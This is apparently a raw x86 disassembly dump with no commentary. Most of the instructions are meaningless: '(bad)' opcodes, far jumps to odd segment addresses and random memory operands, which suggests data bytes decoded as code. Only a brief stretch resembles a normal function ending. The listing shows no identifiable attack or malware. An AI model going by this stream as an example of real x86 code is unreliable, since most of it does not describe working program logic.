  4140e1:	int3   
  4140e2:	add    bh,bh
  4140e4:	mov    ecx,ecx
  4140e6:	jmp    FWORD PTR [edi-0x122e8d35]
  4140ec:	add    BYTE PTR [ecx-0x7695c47d],cl
  4140f2:	inc    DWORD PTR [eax]
  4140f4:	adc    DWORD PTR [edi],0xffffffff
  4140f7:	push   ds
  4140f8:	test   edi,ebx
  4140fa:	jmp    0x208d:0xff00ff31
  414101:	mov    edi,edi
  414103:	add    BYTE PTR [eax],al
  414105:	lods   al,BYTE PTR ds:[esi]
  414106:	call   FWORD PTR [ebx+0x45]
  414109:	mov    esp,0x8900346e
  41410e:	call   DWORD PTR [esi+eiz*2-0x76760100]
  414115:	in     eax,0xff
  414117:	mov    ah,0x8e
  414119:	push   esp
  41411a:	mov    al,ds:0xffffeb
  41411f:	data16 test BYTE PTR [eax],al
  414122:	add    BYTE PTR [eax],al
  414124:	add    BYTE PTR [edx-0x504dcb7d],al
  41412a:	dec    esi
  41412b:	popf   
  41412c:	add    BYTE PTR [eax],al
  41412e:	int3   
  41412f:	jo     0x414196
  414131:	mov    edi,edi
  414133:	inc    DWORD PTR [eax]
  414135:	add    bh,bh
  414137:	mov    cl,bl
  414139:	test   BYTE PTR [ebp-0x39],dh
  41413c:	add    bh,bh
  41413e:	call   eax
  414140:	fdiv   st(7),st
  414142:	mov    edi,edi
  414144:	mov    DWORD PTR [ebx-0x1],ecx
  414147:	ret    0xd164
  41414a:	jmp    0xff41424d
  41414f:	repz fiadd WORD PTR [eax]
  414152:	mov    DWORD PTR [ebx+0x53ffefff],eax
  414158:	inc    edi
  414159:	test   ch,bl
  41415b:	xchg   edi,edi
  41415d:	inc    DWORD PTR [eax]
  41415f:	or     cl,dh
  414161:	dec    DWORD PTR [ecx-0x7cd07d00]
  414167:	test   DWORD PTR [ebp-0x642098],0x5a9500ff
  414171:	dec    esp
  414173:	dec    esp
  414175:	or     BYTE PTR [ecx+0xa4dbff7],0xd4
  41417c:	add    bh,bh
  41417e:	add    BYTE PTR [esi],dh
  414180:	cmp    bh,bh
  414182:	(bad)  
  414183:	inc    DWORD PTR [eax]
  414185:	sub    al,BYTE PTR [ebx-0x58617aad]
  41418b:	into   
  41418c:	inc    DWORD PTR [ebx-0x5bcb7d]
  414192:	(bad)  
  414193:	inc    DWORD PTR [eax]
  414195:	lea    eax,[eax]
  414197:	push   ds
  414198:	iret   
  414199:	add    dh,BYTE PTR [ebp-0x3300fffb]
  41419f:	adc    eax,0xffda
  4141a4:	sub    DWORD PTR [ebx+0x62102700],0xd
  4141ab:	or     edi,edi
  4141ad:	inc    DWORD PTR [eax]
  4141af:	stc    
  4141b0:	loop   0x4141b1
  4141b2:	add    BYTE PTR [ebx+0x29893589],al
  4141b8:	push   esp
  4141b9:	adc    dl,dh
  4141bb:	pop    esi
  4141bc:	(bad)  
  4141bd:	(bad)  
  4141be:	call   FWORD PTR [eax]
  4141c0:	cwde   
  4141c1:	add    bh,bh
  4141c3:	inc    DWORD PTR [eax]
  4141c5:	add    eax,0xff157fff
  4141ca:	(bad)  
  4141cb:	(bad)  
  4141cc:	(bad)  
  4141cd:	inc    DWORD PTR [eax]
  4141cf:	add    al,ch
  4141d1:	sti    
  4141d2:	in     al,0xfe
  4141d4:	(bad)  
  4141d5:	call   0x435d80
  4141da:	push   0x430c00
  4141df:	call   0x43cd90
  4141e4:	add    esp,0x4
  4141e7:	xor    eax,eax
  4141e9:	ret    
  4141ea:	int3   
  4141eb:	int3   
  4141ec:	int3   
  4141ed:	int3   
  4141ee:	int3   
  4141ef:	int3   
  4141f0:	mov    al,ds:0xa9fff2cc
  4141f5:	push   DWORD PTR [eax]
  4141f7:	xor    DWORD PTR [edi],0x0
  4141fa:	cld    
  4141fb:	int3   
  4141fc:	test   DWORD PTR [eax],0x838ccc63
  414202:	popa   
  414203:	int3   
  414204:	(bad)  
  414205:	inc    DWORD PTR [ebx+eax*4+0xd60029]
  41420c:	sar    bh,0x4b
  41420f:	add    BYTE PTR [ebp+0x4bffebff],cl
  414215:	call   DWORD PTR [edi+edi*8-0x33f1007c]
  41421c:	inc    edx
  41421d:	add    BYTE PTR [ecx-0x5700fb01],ch
  414223:	(bad)  
  414224:	cmp    edi,edi
  414226:	clc    
  414227:	mov    DWORD PTR [ecx+0x0],edx
  41422a:	popa   
  41422b:	call   ecx
  41422d:	add    ah,dl
  41422f:	inc    DWORD PTR [edi-0x1]
  414232:	(bad)  
  414234:	arpl   di,di
  414236:	into   
  414237:	add    BYTE PTR [ecx+ecx*4+0x74],bh
  41423b:	and    eax,0xffffff83
  41423e:	cmp    edi,edi
  414240:	adc    eax,0xb1ff0cff
  414245:	mov    DWORD PTR [eax+eax*1+0xe7898f],esi
  41424c:	adc    DWORD PTR [eax],eax
  41424e:	outs   dx,BYTE PTR ds:[esi]
  41424f:	push   DWORD PTR [ebx]
  414251:	jmp    FWORD PTR [ebx]
  414253:	add    BYTE PTR [ebp-0x1],ch
  414256:	pop    ss
  414257:	add    BYTE PTR [edx+0x540029cc],al
  41425d:	jmp    DWORD PTR [ebx]
  41425f:	(bad)  
  414260:	dec    ah
  414262:	push   ecx
  414263:	add    BYTE PTR [edx],cl
  414265:	sbb    DWORD PTR [edi-0x7d],0x4d
  414269:	dec    edi
  41426b:	sbb    DWORD PTR [edi+0x580002ff],0xffffffff
  414272:	cli    
  414273:	inc    DWORD PTR [ecx-0x34]
  414276:	dec    ebp
  414277:	dec    ecx
  414279:	int3   
  41427a:	pop    ebp
  41427b:	call   ebx
  41427d:	add    BYTE PTR [eax],ah
  41427f:	call   FWORD PTR [eax+0x5800d0ff]
  414285:	mov    DWORD PTR [eax-0x7d],eax
  414288:	push   edx
  414289:	add    BYTE PTR [esi],bh
  41428b:	add    BYTE PTR [ebp-0x1],dl
  41428e:	xchg   ecx,eax
  41428f:	add    BYTE PTR [eax+eax*1+0x29],bl
  414293:	jmp    DWORD PTR [edi]
  414295:	jmp    DWORD PTR [edi+0x57ff1389]
  41429b:	add    BYTE PTR ds:0x17ff3eff,dl
  4142a1:	add    cl,bl
  4142a3:	mov    DWORD PTR [edi-0x25ffa200],ebx
  4142a9:	inc    DWORD PTR [edx-0x157c7434]
  4142af:	add    dh,bl
  4142b1:	add    BYTE PTR [edx+0x48ff1bcc],dh
  4142b7:	mov    esp,ecx
  4142b9:	call   FWORD PTR [edx-0x4b008f01]
  4142bf:	jmp    DWORD PTR [ecx+0x7e004489]
  4142c5:	(bad)  
  4142c6:	mov    esp,0x3e002b00
  4142cb:	int3   
  4142cc:	add    eax,0xefff88cc
  4142d1:	add    BYTE PTR [edi+0x0],bh
  4142d4:	mov    DWORD PTR [ebx-0x4cff98],eax
  4142da:	or     edi,edi
  4142dc:	inc    ebx
  4142dd:	push   ebp
  4142df:	dec    esi
  4142e1:	inc    DWORD PTR [edx]
  4142e3:	add    BYTE PTR [edx],ah
  4142e5:	int3   
  4142e6:	out    dx,eax
  4142e7:	mov    DWORD PTR [ecx-0x34],ebp
  4142ea:	(bad)  
  4142ec:	leave  
  4142ed:	add    dl,bh
  4142ef:	(bad)  
  4142f0:	cmp    bh,bh
  4142f2:	pop    ss
  4142f3:	(bad)  
  4142f4:	std    
  4142f5:	add    bh,dh
  4142f7:	push   DWORD PTR [ebp-0x38003700]
  4142fd:	(bad)  
  4142fe:	js     0x414300
  414300:	rol    BYTE PTR [eax],1
  414302:	xchg   edx,eax
  414303:	add    ah,ah
  414305:	dec    DWORD PTR [edi-0x7d]
  414308:	add    BYTE PTR [eax],0x49
  41430b:	add    ch,bh
  41430d:	add    dl,cl
  41430f:	jmp    DWORD PTR ds:0x2b83d2ff
  414315:	adc    DWORD PTR [ebx+0x220022ff],0xffffffff
  41431c:	jmp    0x41431d
  41431e:	sub    eax,DWORD PTR [ebx-0x768b0081]
  414324:	jb     0x414325
  414326:	jecxz  0x4142ab
  414328:	imul   eax,DWORD PTR [eax],0xff38cc54
  41432e:	add    BYTE PTR ds:[edi-0x7e00f577],bl
  414335:	add    BYTE PTR [esp+ecx*8],cl
  414338:	cmc    
  414339:	mov    DWORD PTR [ecx+0x43ff8783],esp
  41433f:	add    BYTE PTR [edi],cl
  414341:	and    DWORD PTR [edi-0x34],0xc
  414345:	int3   
  414346:	out    dx,al
  414347:	int3   
  414348:	cmp    edi,edi
  41434a:	push   cs
  41434b:	and    DWORD PTR [edx],0x0
  41434e:	inc    esp
  41434f:	mov    DWORD PTR [ecx],eax
  414351:	add    dh,bl
  414353:	jmp    DWORD PTR [edi+edi*8]
  414356:	int3   
  414357:	jmp    FWORD PTR [edx+0x3289f100]
  41435d:	add    ah,dl
  41435f:	add    BYTE PTR [ebp+0x23ffea00],bh
  414365:	and    DWORD PTR ds:0x7ffedff,0xffffffff
  41436c:	inc    eax
  41436d:	dec    DWORD PTR [eax-0x1]
  414370:	sahf   
  414371:	add    BYTE PTR [edi+0x18ffabcc],dh
  414377:	mov    DWORD PTR [ebx+eax*4+0x15cc03],ecx
  41437e:	adc    ah,cl
  414380:	arpl   di,di
  414382:	loopne 0x414383
  414384:	pop    ecx
  414385:	(bad)  
  414386:	fadd   QWORD PTR [eax]
  414388:	fld    QWORD PTR [eax]
  41438a:	(bad)  
  41438b:	int3   
  41438c:	inc    esp
  41438d:	add    BYTE PTR [edi],bh
  41438f:	push   DWORD PTR [edi]
  414391:	jmp    FWORD PTR [edx]
  414393:	inc    DWORD PTR [eax]
  414395:	mov    DWORD PTR [ebp+0x2ffe783],edx
  41439b:	jmp    DWORD PTR [ebx+0x1c835c83]
  4143a1:	or     DWORD PTR [eax+0x4a83ed00],0xffffffcc
  4143a8:	push   ds
  4143a9:	or     DWORD PTR [edi+edi*8-0x24ff4d],0xe
  4143b1:	add    ch,dh
  4143b3:	mov    ecx,ecx
  4143b5:	int3   
  4143b6:	add    BYTE PTR fs:[eax+0x0],bh
  4143ba:	adc    al,BYTE PTR [eax]
  4143bc:	add    al,BYTE PTR [eax]
  4143be:	push   ss
  4143bf:	cmp    DWORD PTR [ebx-0x1],0xffffffae
  4143c3:	push   DWORD PTR [ebx+eax*4-0x7b]
  4143c7:	and    DWORD PTR [esi-0x6200d100],0xffffff89
  4143ce:	pop    DWORD PTR [eax]
  4143d0:	int    0xcc
  4143d2:	in     eax,dx
  4143d3:	jmp    DWORD PTR [edi-0x5ffa601]
  4143d9:	mov    DWORD PTR [ebx],esi
  4143db:	(bad)  
  4143dc:	mov    eax,0x19ff1b00
  4143e1:	inc    DWORD PTR [ebp-0x34]
  4143e4:	and    BYTE PTR [ebx+0x8b8340],al
  4143ea:	in     al,0x0
  4143ec:	into   
  4143ed:	int3   
  4143ee:	rol    BYTE PTR [eax],0x36
  4143f1:	add    DWORD PTR [eax],0xffffff83
  4143f4:	mov    esi,0xf1009100
  4143f9:	push   ebx
  4143fb:	inc    DWORD PTR [edx-0x7d]
  4143fe:	cwde   
  4143ff:	int3   
  414400:	xchg   ebx,eax
  414401:	call   FWORD PTR [esi]
  414403:	jmp    FWORD PTR [eax+0x4dff6b83]
  414409:	int3   
  41440a:	mov    edx,0x4effcfcc
  41440f:	dec    DWORD PTR [eax+0x0]
  414412:	pop    es
  414413:	int3   
  414414:	in     al,dx
  414415:	int3   
  414416:	mov    ecx,0xb5ff83ff
  41441b:	add    BYTE PTR [eax+eax*1+0x2f],bh
  41441f:	add    dl,dh
  414421:	add    BYTE PTR [edx],ah
  414423:	jmp    FWORD PTR [edi-0x6400c401]
  414429:	inc    DWORD PTR [eax-0x1]
  41442c:	mov    eax,ds:0x42fff1ff
  414431:	call   esp
  414433:	adc    DWORD PTR [ecx+0x6dfff1cc],0x0
  41443a:	outs   dx,DWORD PTR ds:[esi]
  41443b:	add    BYTE PTR [edi-0x7a768234],cl
  414441:	mov    DWORD PTR [ecx],ebp
  414443:	add    BYTE PTR [ebx-0x7d],dl
  414446:	popa   
  414447:	(bad)  
  414448:	in     al,dx
  414449:	dec    DWORD PTR [edi+0x0]
  41444c:	dec    edi
  41444d:	sbb    esi,0xffffffff
  414450:	dec    esi
  414451:	add    DWORD PTR [ebp-0x34],0x2a
  414455:	add    BYTE PTR [ebp-0x34],al
  414458:	aam    0x89
  41445a:	push   esp
  41445b:	dec    DWORD PTR [edx]
  41445d:	mov    DWORD PTR ds:0xdb839400,ebx
  414463:	(bad)  
  414464:	cmp    eax,0x65ff33ff
  414469:	add    ah,dl
  41446b:	or     esi,0xffffffff
  41446e:	fld    QWORD PTR [eax]
  414470:	sahf   
  414471:	(bad)  
  414472:	mov    ebx,0xd0832d00
  414477:	(bad)  
  414478:	jl     0x41447a
  41447a:	pop    es
  41447b:	push   DWORD PTR [edi]
  41447d:	and    DWORD PTR [edi+edi*8+0x67],0xffffffff
  414482:	call   DWORD PTR gs:[edi+0x0]
  414486:	outs   dx,DWORD PTR ds:[esi]
  414487:	inc    DWORD PTR [eax-0x34]
  41448a:	adc    DWORD PTR [ebx+0x9cfff4],eax
  414490:	pop    esp
  414491:	add    bl,dl
  414493:	add    BYTE PTR [ebp+0x0],al
  414496:	test   BYTE PTR [eax],al
  414498:	mov    ebp,0x560064ff
  41449d:	int3   
  41449e:	pushf  
  41449f:	(bad)  
  4144a0:	mov    edi,0xd100c600
  4144a5:	int3   
  4144a6:	dec    ebp
  4144a7:	push   DWORD PTR [ebx-0x7d]
  4144aa:	cdq    
  4144ab:	push   DWORD PTR [ebx]
  4144ad:	adc    DWORD PTR ds:0xd5837d00,0xffffffff
  4144b4:	dec    ecx
  4144b5:	add    dl,cl
  4144b7:	push   DWORD PTR [edi]
  4144b9:	inc    DWORD PTR [edi+edi*8+0x60]
  4144bd:	sub    DWORD PTR [edx+0x0],0xffffffb7
  4144c1:	call   DWORD PTR [ebp+0x3ff6e83]
  4144c7:	add    BYTE PTR [eax+0x0],dl
  4144ca:	scas   eax,DWORD PTR es:[edi]
  4144cb:	int3   
  4144cc:	and    ah,cl
  4144ce:	jg     0x4144d0
  4144d0:	and    eax,0x7c00c183
  4144d5:	jmp    eax
  4144d7:	cmp    DWORD PTR [ecx],0xffffffff
  4144da:	ins    BYTE PTR es:[edi],dx
  4144db:	add    ah,dl
  4144dd:	add    BYTE PTR [edi],cl
  4144df:	dec    DWORD PTR [esi-0xe7c0d01]
  4144e5:	add    BYTE PTR [ebx],ah
  4144e7:	int3   
  4144e8:	push   ds
  4144e9:	(bad)  
  4144ea:	(bad)  
  4144ec:	cmc    
  4144ed:	add    BYTE PTR [ebp-0x1],bl
  4144f0:	out    0x83,al
  4144f2:	out    dx,eax
  4144f3:	add    BYTE PTR [edi+edi*8-0xf4ff53],cl
  4144fa:	push   ebp
  4144fb:	add    BYTE PTR [ebp-0x14000801],al
  414501:	add    bl,cl
  414503:	call   FWORD PTR [edx-0x1]
  414506:	xor    eax,0x28ff89cc
  41450b:	call   FWORD PTR [ebp-0x7d]
  41450e:	cmp    al,0x0
  414510:	sbb    al,BYTE PTR [eax]
  414512:	or     bh,bh
  414514:	jg     0x414515
  414516:	ins    DWORD PTR es:[edi],dx
  414517:	int3   
  414518:	(bad)  
  414519:	jmp    FWORD PTR [edx]
  41451b:	add    BYTE PTR [ebx-0x7338200],bh
  414521:	push   DWORD PTR [eax]
  414523:	push   DWORD PTR [eax]
  414525:	(bad)  
  414526:	fld    DWORD PTR [eax]
  414528:	sub    edi,edi
  41452a:	xor    eax,0xf0ffa9cc
  41452f:	add    BYTE PTR [eax-0x1],dh
  414532:	(bad)  
  414533:	jmp    DWORD PTR [eax-0x1]
  414536:	jge    0x414537
  414538:	(bad)  
  414539:	dec    DWORD PTR [eax+eax*1]
  41453c:	rol    DWORD PTR [eax],cl
  41453e:	pop    ds
  41453f:	jmp    FWORD PTR [ebp-0x34]
  414542:	ins    BYTE PTR es:[edi],dx
  414543:	call   esp
  414545:	sbb    DWORD PTR [ebp-0x77],0x0
  414549:	int3   
  41454a:	mov    ah,0x0
  41454c:	call   0x4641a451
  414551:	jmp    FWORD PTR [edx-0x61008b00]
  414557:	add    dl,ah
  414559:	(bad)  
  41455a:	cmp    ecx,esp
  41455c:	jne    0x41455d
  41455e:	pushf  
  41455f:	add    BYTE PTR [edx-0x1],bh
  414562:	and    DWORD PTR [eax],eax
  414564:	out    dx,al
  414565:	(bad)  
  414566:	mov    esp,0x2dff4b83
  41456b:	add    BYTE PTR [eax+0x14ffcc83],cl
  414571:	add    BYTE PTR [eax],bl
  414573:	add    al,bh
  414575:	sub    DWORD PTR [edx],0xffffff89
  414578:	mov    dh,0x89
  41457a:	inc    BYTE PTR [eax]
  41457c:	and    eax,0xda83cfff
  414581:	or     DWORD PTR [eax+eax*1-0xda7cd1],0xfffffff7
  414589:	(bad)  
  41458a:	jge    0x41458b
  41458c:	sar    bh,1
  41458e:	int3   
  41458f:	(bad)  
  414590:	clc    
  414591:	cmp    DWORD PTR [esi],0xffffffff
  414594:	sbb    al,0x0
  414596:	fadd   QWORD PTR [eax]
  414598:	xchg   ebx,eax
  414599:	add    BYTE PTR [edi+edi*8+0x52],ah
  41459d:	sbb    edi,0xffffff89
  4145a0:	add    eax,0x6bff8700
  4145a5:	inc    edi
  4145a7:	add    dh,ch
  4145a9:	dec    DWORD PTR [edx]
  4145ab:	(bad)  
  4145ac:	fcmove st,st(4)
  4145ae:	or     esp,0xb0cc59
  4145b4:	popa   
  4145b5:	int3   
  4145b6:	ret    0xabcc
  4145b9:	int3   
  4145ba:	cmp    DWORD PTR [eax],eax
  4145bc:	mov    ah,0xff
  4145be:	cdq    
  4145bf:	(bad)  
  4145c0:	mov    edx,0x6a007b00
  4145c5:	mov    DWORD PTR [esi-0x34],ecx
  4145c8:	lock jmp FWORD PTR [edx]
  4145cb:	jmp    FWORD PTR [esi-0x7affed00]
  4145d1:	int3   
  4145d2:	in     al,dx
  4145d3:	jmp    DWORD PTR [ecx-0x10006f00]
  4145d9:	add    DWORD PTR [edi+edi*8-0x3f005f],0xffffff97
  4145e1:	add    BYTE PTR [eax+0x2dffb4ff],ch
  4145e7:	sbb    DWORD PTR [ebx-0x1],0xffffffdb
  4145eb:	add    BYTE PTR [edi],cl
  4145ed:	add    BYTE PTR ds:0xacce800,dh
  4145f3:	int3   
  4145f4:	push   ds
  4145f5:	sbb    DWORD PTR [eax],0x0
  4145f8:	idiv   bh
  4145fa:	mov    eax,0x9cff7600
  4145ff:	jmp    eax
  414601:	push   DWORD PTR [ebx+eax*4-0xb70047]
  414608:	lock push DWORD PTR [edi+0x2800aa89]
  41460f:	add    BYTE PTR [ebp+0x0],bl
  414612:	jnp    0x414613
  414614:	retf   
  414615:	call   FWORD PTR [edi+0xccc76ff]
  41461b:	dec    DWORD PTR [esi]
  41461d:	(bad)  
  41461e:	mov    edx,0xcf003000
  414623:	add    BYTE PTR [esp+ecx*8-0x6600ea],dh
  41462a:	stc    
  41462b:	push   DWORD PTR [ecx+0x2e003700]
  414631:	mov    ecx,edi
  414633:	add    ah,bh
  414635:	add    dl,bh
  414637:	mov    DWORD PTR [ebp+0x28ff4583],edx
  41463d:	dec    esp
  41463f:	sbb    DWORD PTR [ecx-0x1c003700],0xffffffff
  414646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414647:	add    BYTE PTR [edi+0x3600a800],ch
  41464d:	call   FWORD PTR [eax+eax*1-0x8476af]
  414654:	sub    eax,0xfa83f9ff
  414659:	add    BYTE PTR [ecx-0x56ff947d],cl
  41465f:	sub    DWORD PTR [eax+eax*1+0x7e],0xffffff83
  414664:	xor    al,0x0
  414666:	sbb    DWORD PTR [ebx-0x3342ff38],eax
  41466c:	sub    al,BYTE PTR [eax]
  41466e:	mov    eax,ds:0x7fff54cc
  414673:	call   DWORD PTR [edx-0x1]
  414676:	jmp    0x3600:0x3d837b00
  41467d:	cmp    DWORD PTR [edi+0x64837cff],0xffffffcc
  414684:	jns    0x414686
  414686:	add    edi,edi
  414688:	jmp    0x95ff:0x340063ff
  41468f:	dec    DWORD PTR [ecx-0x6800d300]
  414695:	add    BYTE PTR [esp+ecx*8-0x7c33ff99],ah
  41469c:	dec    esp
  41469d:	inc    DWORD PTR [edx]
  41469f:	add    al,ch
  4146a1:	sbb    DWORD PTR [ebp-0x1],0xffffffbe
  4146a5:	(bad)  
  4146a6:	add    BYTE PTR ds:[esi],bh
  4146a9:	add    al,dl
  4146ab:	add    BYTE PTR [eax],bl
  4146ad:	int3   
  4146ae:	xlat   BYTE PTR ds:[ebx]
  4146af:	sub    esi,0xffffff89
  4146b2:	adc    bh,bh
  4146b4:	mov    ebp,0x4e002683
  4146b9:	add    dh,ah
  4146bb:	dec    DWORD PTR [ebp+0x2ff3000]
  4146c1:	add    BYTE PTR [ebx],ah
  4146c3:	mov    DWORD PTR [edx-0x16ffe97d],eax
  4146c9:	jmp    FWORD PTR [edx]
  4146cb:	add    BYTE PTR [edx-0x7ff2700],al
  4146d1:	add    BYTE PTR [ebx],al
  4146d3:	add    BYTE PTR [eax+eax*1],ch
  4146d6:	out    0x0,al
  4146d8:	rol    DWORD PTR [eax],0xde
  4146db:	call   DWORD PTR [edi]
  4146dd:	call   edi
  4146df:	(bad)  
  4146e0:	aas    
  4146e1:	int3   
  4146e2:	sub    BYTE PTR [ecx+0x88ff6a],cl
  4146e8:	push   ds
  4146e9:	cmp    eax,0x0
  4146ec:	push   ebx
  4146ed:	jmp    DWORD PTR [edx-0x2300ad01]
  4146f3:	sbb    DWORD PTR [ebp-0x7d],0x78
  4146f7:	add    BYTE PTR [edx+0x3183cb83],ch
  4146fd:	add    bh,ch
  4146ff:	add    BYTE PTR [ebp+0x0],dh
  414702:	jge    0x414703
  414704:	add    eax,0xa9ff3683
  414709:	mov    ecx,esi
  41470b:	(bad)  
  41470c:	out    dx,al
  41470d:	(bad)  
  41470e:	(bad)  
  414710:	push   0x4fffd7ff
  414715:	add    BYTE PTR [eax+eax*1+0x19],al
  414719:	dec    DWORD PTR [edi+edi*8]
  41471c:	fwait
  41471d:	int3   
  41471e:	adc    eax,0x7fff2ff
  414723:	call   DWORD PTR [edi+edi*8-0x7c]
  414727:	mov    DWORD PTR [edi+edi*8],edi
  41472a:	mov    es,WORD PTR [eax]
  41472c:	pop    edx
  41472d:	inc    DWORD PTR [ecx]
  41472f:	jmp    FWORD PTR [ebp-0x7d]
  414732:	cmp    al,BYTE PTR [ebx-0x7c783316]
  414738:	adc    eax,DWORD PTR [eax]
  41473a:	sahf   
  41473b:	sbb    DWORD PTR [ecx+0x0],0xa
  41473f:	call   FWORD PTR [eax+eax*1-0x8400fc]
  414746:	or     eax,0xe0ffb9ff
  41474b:	push   ecx
  41474d:	call   DWORD PTR [ebx+0x0]
  414750:	jle    0x414751
  414752:	stos   DWORD PTR es:[edi],eax
  414753:	add    ch,bl
  414755:	int3   
  414756:	xchg   edi,eax
  414757:	inc    DWORD PTR [ecx+ecx*4-0x6c]
  41475b:	jmp    DWORD PTR [eax-0x1]
  41475e:	imul   edi,edi,0x79ccc4
  414764:	dec    edi
  414765:	add    BYTE PTR [eax+0x0],bh
  414768:	push   0xffffffff
  41476a:	es add ebp,0xffffffff
  41476e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41476f:	add    BYTE PTR [ecx-0x77],al
  414772:	mov    DWORD PTR [eax],eax
  414774:	xor    al,0xff
  414776:	(bad)  
  414777:	call   DWORD PTR [edi+edi*8+0x42ff54]
  41477e:	jge    0x41477f
  414780:	fiadd  DWORD PTR [eax]
  414782:	mov    edi,edi
  414784:	in     al,dx
  414785:	or     edx,0xffffffff
  414788:	aaa    
  414789:	call   edx
  41478b:	mov    DWORD PTR [eax-0x1],ebx
  41478e:	push   ebx
  41478f:	(bad)  
  414790:	mov    eax,0x2083c0ff
  414795:	int3   
  414796:	js     0x414797
  414798:	dec    esp
  414799:	and    esp,0xffffffff
  41479c:	dec    ah
  41479e:	aam    0xff
  4147a0:	xchg   ebp,eax
  4147a1:	or     DWORD PTR [edx+0x0],0x4b
  4147a5:	dec    DWORD PTR [edi-0x77]
  4147a8:	cli    
  4147a9:	mov    DWORD PTR [edi-0x1],edi
  4147ac:	icebp  
  4147ad:	add    BYTE PTR [eax+0x370054ff],dl
  4147b3:	(bad)  
  4147b4:	cmp    eax,DWORD PTR [eax]
  4147b6:	mov    ah,0x0
  4147b8:	mov    eax,ds:0x148382ff
  4147bd:	call   FWORD PTR [esp+ecx*8]
  4147c0:	loope  0x414745
  4147c2:	std    
  4147c3:	add    BYTE PTR [eax-0x1],ah
  4147c6:	jae    0x414751
  4147c8:	idiv   edi
  4147ca:	jg     0x4147cc
  4147cc:	xchg   BYTE PTR [ecx-0x7c380023],cl
  4147d2:	retf   0x88ff
  4147d5:	(bad)  
  4147d6:	js     0x4147d7
  4147d8:	es push esi
  4147db:	call   DWORD PTR [edx-0x1]
  4147de:	test   ah,cl
  4147e0:	mov    BYTE PTR [ebx-0xbc],al
  4147e6:	push   eax
  4147e7:	(bad)  
  4147e8:	mov    ebx,0x8200feff
  4147ed:	add    BYTE PTR [eax+0x71ffe200],ch
  4147f3:	add    BYTE PTR [eax],ah
  4147f5:	inc    eax
  4147f7:	call   DWORD PTR [edi+edi*8+0x8b0005]
  4147fe:	stos   DWORD PTR es:[edi],eax
  4147ff:	dec    DWORD PTR [eax-0x65ff0600]
  414805:	inc    ecx
  414807:	cmp    DWORD PTR [edi+edi*8+0x46],0xffffffff
  41480c:	out    dx,al
  41480d:	add    BYTE PTR [edx],bh
  41480f:	or     DWORD PTR [edi+edi*8],0x1
  414813:	(bad)  
  414814:	cli    
  414815:	add    BYTE PTR [eax+eax*1],dh
  414818:	sbb    bh,bh
  41481a:	add    al,0x0
  41481c:	jae    0x41481d
  41481e:	pop    eax
  41481f:	jmp    DWORD PTR [edi]
  414821:	adc    DWORD PTR [eax+0x4600cdff],0xffffffff
  414828:	cmc    
  414829:	add    ah,ch
  41482b:	sub    edi,0xffffffcc
  41482e:	in     al,0x89
  414830:	mov    cl,0x83
  414832:	(bad)  
  414833:	call   DWORD PTR [esi]
  414835:	add    BYTE PTR [esi-0x1],dl
  414838:	pop    es
  414839:	dec    DWORD PTR [ecx]
  41483b:	inc    DWORD PTR [edi]
  41483d:	jmp    DWORD PTR [esi+0x0]
  414840:	cmp    BYTE PTR [ebx+0x5effab],al
  414846:	sbb    cl,ah
  414848:	str    esp
  41484b:	call   FWORD PTR [edi+edi*8]
  41484e:	jg     0x41484f
  414850:	inc    ebx
  414851:	jmp    FWORD PTR ds:0x1ff8aff
  414857:	mov    esi,ebp
  414859:	or     ebp,0xffffffff
  41485c:	cmp    eax,0xf3ff1800
  414861:	push   DWORD PTR [edx+0x70ff4000]
  414867:	jmp    DWORD PTR [ebx+0x6cffab00]
  41486d:	add    BYTE PTR [ecx-0x59ff8301],dh
  414873:	add    BYTE PTR [edx+0x0],bh
  414876:	and    eax,0x8b89e7ff
  41487b:	add    BYTE PTR [edx+0x32ffc683],dl
  414881:	(bad)  
  414882:	cmp    edi,edi
  414884:	pop    ds
  414885:	call   DWORD PTR [edi-0x1]
  414888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414889:	add    BYTE PTR [eax+eax*1],dl
  41488c:	inc    ecx
  41488d:	inc    DWORD PTR [edi-0x7d]
  414890:	test   eax,0xeffeb00
  414895:	sbb    DWORD PTR [edi+0x51cc7aff],0xffffffcc
  41489c:	les    eax,FWORD PTR [eax]
  41489e:	cmp    al,0x89
  4148a0:	push   esi
  4148a1:	and    DWORD PTR [ebp-0x7d],0xffffffd0
  4148a5:	call   FWORD PTR [ecx]
  4148a7:	(bad)  
  4148a8:	stc    
  4148a9:	(bad)  
  4148aa:	add    BYTE PTR ds:[eax],ch
  4148ad:	and    DWORD PTR [esi],0xffffffcc
  4148b0:	xchg   ebp,eax
  4148b1:	(bad)  
  4148b2:	cld    
  4148b3:	add    BYTE PTR [ecx+ecx*4],bh
  4148b6:	or     edi,edi
  4148b8:	inc    esp
  4148b9:	add    bh,al
  4148bb:	add    BYTE PTR [esi],dh
  4148bd:	mov    ebx,edx
  4148bf:	add    DWORD PTR [esi-0x16006d01],0xffffffff
  4148c6:	call   FWORD PTR ds:[eax-0x1]
  4148ca:	pop    ds
  4148cb:	(bad)  
  4148cc:	mov    ebx,0xe1fff483
  4148d1:	call   DWORD PTR [edx]
  4148d3:	inc    DWORD PTR [ecx-0x1]
  4148d6:	ds int3 
  4148d8:	adc    edi,edi
  4148da:	in     eax,dx
  4148db:	sbb    ebp,0xffffffff
  4148de:	inc    esi
  4148df:	sub    DWORD PTR [ebx-0x7d],0x76
  4148e3:	int3   
  4148e4:	pop    eax
  4148e5:	dec    DWORD PTR [edi+0x30ffeaff]
  4148eb:	jmp    edx
  4148ed:	dec    DWORD PTR [edi+0x0]
  4148f0:	dec    edx
  4148f1:	add    BYTE PTR [eax-0x18ff657d],bl
  4148f7:	push   DWORD PTR [esp+ecx*8-0x7c94ff75]
  4148fe:	clc    
  4148ff:	mov    esi,esp
  414901:	jmp    FWORD PTR [ebx-0x3f00227d]
  414907:	push   DWORD PTR [eax+0x1002aff]
  41490d:	dec    edi
  41490f:	add    al,bh
  414911:	and    DWORD PTR [ebp+0x0],0x6c
  414915:	(bad)  
  414916:	fiadd  DWORD PTR [eax]
  414918:	test   edi,edi
  41491a:	inc    ebx
  41491b:	mov    DWORD PTR [ecx],esi
  41491d:	(bad)  
  41491e:	clc    
  41491f:	add    al,ah
  414921:	add    bh,dl
  414923:	add    BYTE PTR [eax-0x1],ch
  414926:	xchg   edi,eax
  414927:	jmp    DWORD PTR [edi-0x1]
  41492a:	test   eax,0x39ff71ff
  41492f:	add    BYTE PTR [ebp+0x16ff2f00],ch
  414935:	call   ebp
  414937:	jmp    FWORD PTR [ecx]
